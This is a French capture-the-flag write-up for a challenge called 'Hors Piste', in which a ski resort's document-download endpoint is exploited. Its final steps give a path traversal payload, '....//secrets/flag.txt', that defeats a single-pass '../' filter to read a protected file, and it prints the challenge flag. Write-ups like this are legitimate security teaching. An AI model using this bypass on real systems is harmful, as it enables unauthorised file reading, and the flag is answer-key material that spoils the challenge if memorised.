# Hors Piste (Path Traversal + Filter Bypass)

**Flag :** `HSR{h0rs_p1st3_4tt3nt10n_4ux_4v4l4nch3s!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Découvrir le lien CGU](#étape-1---découvrir-le-lien-cgu)
- [Étape 2 - Répondre au formulaire des CGU](#étape-2---répondre-au-formulaire-des-cgu)
- [Étape 3 - Appeler /api/status](#étape-3---appeler-apistatus)
- [Étape 4 - Télécharger le fichier caché](#étape-4---télécharger-le-fichier-caché)
- [Étape 5 - Tenter la traversée de répertoire](#étape-5---tenter-la-traversée-de-répertoire)
- [Étape 6 - Contournement du filtre](#étape-6---contournement-du-filtre)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à une bibliothèque documentaire de station de ski. Trois documents sont visibles et téléchargeables via un lien `/download?file=nom.txt`.

---

## Étape 1 - Découvrir le lien CGU

En bas de la page, un petit lien discret " Conditions Générales d'Utilisation " est présent dans le footer. On clique dessus et on arrive sur `/cgu`.

---

## Étape 2 - Répondre au formulaire des CGU

En bas de la page CGU, un formulaire demande : " Qui contacter en cas de problème relatif à vos données personnelles ? "

La réponse se trouve dans l'article 7 : " contactez le **DPO** de la station ". On répond `DPO` et on valide.

On est redirigé vers la page d'accueil. Si on retourne sur la page CGU et qu'on regarde attentivement la dernière ligne, elle a changé :

Avant : `Dernière mise à jour : 06 juin 2026 à 20h59 | Version 1.0.0`
Après : `Dernière mise à jour : 06 juin 2026 à 20h59 | api: /api/status | Version 1.0.0`

Le hint `/api/status` est glissé discrètement dans le footer des CGU. Le serveur utilise des sessions (`express-session`) pour isoler chaque participant. La modification n'apparaît que pour ceux qui ont validé le formulaire.

---

## Étape 3 - Appeler /api/status

```
GET /api/status
```

Réponse :

```json
{
  "status": "opérationnel",
  "version": "1.0.0",
  "server": {
    "node": "v22.x.x",
    "uptime": "...",
    "workdir": "/app",
    "docs_path": "/app/docs"
  },
  "pistes": { "ouvertes": 13, "fermees": 2 },
  "maintenance": {
    "last_report": "maintenance-log.txt",
    "next_scheduled": "2026-07-15"
  }
}
```

Deux informations cruciales :
- Le serveur tourne dans `/app`, les docs sont dans `/app/docs`
- Un fichier `maintenance-log.txt` est référencé dans `maintenance.last_report` mais n'apparaît pas dans la liste des documents

---

## Étape 4 - Télécharger le fichier caché

On tente de télécharger ce fichier non listé :

```
GET /download?file=maintenance-log.txt
```

Le fichier existe et contient :

```
- Backup des données capteurs copié dans /app/secrets/
```

On sait maintenant qu'un répertoire `secrets/` existe dans `/app/`.

---

## Étape 5 - Tenter la traversée de répertoire

On essaie de remonter d'un répertoire pour atteindre `secrets/flag.txt` :

```
GET /download?file=../secrets/flag.txt
```

Réponse : **Fichier introuvable**. Le serveur filtre les `../`.

---

## Étape 6 - Contournement du filtre

Le filtre supprime `../` du paramètre, mais en une seule passe. En écrivant `....//`, après suppression de `../` au milieu, il reste `../` :

```
....//  ->  suppression de ../  ->  ../
```

Requête finale :

```
GET /download?file=....//secrets/flag.txt
```

Le serveur filtre `....//secrets/flag.txt` en `../secrets/flag.txt`, puis `path.join(__dirname, "docs", "../secrets/flag.txt")` se résout en `/app/secrets/flag.txt`.

```
HSR{h0rs_p1st3_4tt3nt10n_4ux_4v4l4nch3s!}
```

---

## Résumé de la chaîne de résolution

```
Bibliothèque documentaire (3 documents visibles)
  |
  |-- Footer -> lien CGU (discret)
       |
       |-- Formulaire CGU : "Qui contacter ?" -> réponse "DPO" (article 7)
            |
            |-- Redirection accueil -> retour CGU -> footer modifié révèle /api/status
                 |
                 |-- GET /api/status -> workdir + maintenance.last_report = "maintenance-log.txt"
                      |
                      |-- GET /download?file=maintenance-log.txt -> indice "/app/secrets/"
                           |
                           |-- GET /download?file=../secrets/flag.txt -> bloqué par le filtre
                                |
                                |-- GET /download?file=....//secrets/flag.txt -> contournement -> flag
```
